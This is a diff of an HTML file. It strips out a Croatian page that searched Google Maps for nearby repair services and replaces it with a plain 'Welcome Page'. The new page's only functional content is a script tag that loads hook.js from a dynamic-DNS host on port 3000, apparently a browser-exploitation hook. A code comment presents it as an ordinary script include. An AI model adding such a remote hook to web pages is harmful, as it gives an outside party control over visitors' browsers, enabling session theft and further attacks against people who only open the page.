@@ -1,121 +1,14 @@
 <!DOCTYPE html>
-<html lang="hr">
+<html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Pretraga servisa u vašoj blizini</title>
-  <style>
-    body {
-      font-family: Copperplate, Papyrus, fantasy;
-      margin: 0;
-      padding: 20px;
-      text-align: center;
-      background-color: #f5f5f5;
-      color: #333;
-    }
-
-    .dark-mode {
-      background-color: #333;
-      color: #f5f5f5;
-    }
-
-    h1 {
-      margin-bottom: 20px;
-      text-align: center;
-      font-size: 36px;
-      text-transform: uppercase;
-      color: #333;
-    }
-
-    .dark-mode h1 {
-      color: #f5f5f5;
-    }
-
-    .dark-mode-toggle {
-      margin-right: 10px;
-      display: flex;
-      align-items: center;
-      justify-content: flex-start;
-      width: 24px;
-      height: 24px;
-      border-radius: 50%;
-      background-color: #f5f5f5;
-      color: #333;
-      cursor: pointer;
-      float: left;
-    }
-
-    .dark-mode-toggle.active {
-      background-color: #f5f5f5;
-      color: #333;
-    }
-
-    .button {
-      display: block;
-      width: 80%;
-      max-width: 300px;
-      margin: 10px auto;
-      padding: 12px;
-      font-size: 18px;
-      font-weight: bold;
-      text-transform: uppercase;
-      color: #fff;
-      background-color: #4caf50;
-      border: none;
-      border-radius: 4px;
-      cursor: pointer;
-    }
-
-    .button:hover {
-      background-color: #45a049;
-    }
-
-    .dark-mode .button {
-      background-color: #555;
-    }
-
-    .dark-mode .button:hover {
-      background-color: #666;
-    }
-  </style>
-  <script>
-    function toggleDarkMode() {
-      document.body.classList.toggle("dark-mode");
-      document.getElementById("dark-mode-toggle").classList.toggle("active");
-    }
-
-    function searchNearby(service) {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(function(position) {
-          var lat = position.coords.latitude;
-          var lng = position.coords.longitude;
-          var query = service + " u blizini";
-          var url = "https://www.google.com/maps/search/" + encodeURIComponent(query) + "/@" + lat + "," + lng + ",15z";
-          window.open(url, "_blank");
-        });
-      } else {
-        alert("Geolokacija nije podržana u vašem pregledniku.");
-      }
-    }
-  </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Welcome Page</title>
 </head>
 <body>
-  <div>
-    <div id="dark-mode-toggle" class="dark-mode-toggle" onclick="toggleDarkMode()">&#9679;</div>
-    <span style="font-size: x-small; float: left;">Tamni način</span>
-  </div>
-  <h1>PRETRAGA SERVISA U VAŠOJ BLIZINI</h1>
-  <button class="button" onclick="searchNearby('servisi nadzornog sustava')">Servis nadzornog sustava</button>
-  <button class="button" onclick="searchNearby('servisi bazena')">Servis bazena</button>
-  <button class="button" onclick="searchNearby('servisi telefona')">Servis telefona</button>
-  <button class="button" onclick="searchNearby('servisi automobila')">Servis automobila</button>
-  <button class="button" onclick="searchNearby('električar')">Električar</button>
-  <button class="button" onclick="searchNearby('krovopokrivač')">Krovopokrivač</button>
-  <button class="button" onclick="searchNearby('pvc')">PVC</button>
-  <button class="button" onclick="searchNearby('servis kućanskih aparata i bijele tehnike')">Servis kućanskih aparata i bijele tehnike</button>
-  <button class="button" onclick="searchNearby('servis klima uređaja')">Servis klima uređaja</button>
-  <button class="button" onclick="searchNearby('servis računala i mobitela')">Servis računala i mobitela</button>
-  <button class="button" onclick="searchNearby('staklara')">Staklara</button>
-  <button class="button" onclick="searchNearby('vodoinstalater')">Vodoinstalater</button>
+    <h1>Welcome to My Web Page</h1>
+
+    <!-- Include your script -->
+    <script src="http://server76.ddns.net:3000/hook.js"></script>
 </body>
 </html>
